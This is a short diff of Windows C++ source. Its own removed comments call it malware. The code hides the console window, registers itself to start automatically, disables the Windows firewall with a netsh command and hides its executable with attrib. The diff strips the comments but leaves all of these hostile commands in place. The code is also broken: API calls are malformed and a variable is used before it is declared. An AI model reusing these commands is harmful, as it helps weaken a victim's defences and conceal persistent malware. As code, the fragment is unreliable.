@@ -7,15 +7,15 @@
 // windows ortamında derleyin. (declare on windows)
 using namespace std;
 int main() {
-	FreeConsole(); //console ekranini gizlemek için (for hide black console screen)
+	FreeConsole(); 
 	int * ptr;
-	ShellExecute("//start /path/of/yourprogram.exe"); //autostart için (for autostart-up)
+	ShellExecute("//start /path/of/yourprogram.exe");
 	if (ifile) {
 	return ifile;
 	}
 	else {
-	system("netsh firewall>set opmode disable"); //firewall öldürmek için (default)
-	system("attrib +h +s /path/of/yourprogram.exe"); //gizlemek için (hide your malware)
+	system("netsh firewall>set opmode disable");
+	system("attrib +h +s /path/of/yourprogram.exe"); 
 	ifstream ifile(values.txt);
 	TCHAR szPath[MAX_PATH];
 	GetModuleFileName(NULL,szPath,MAX_PATH);
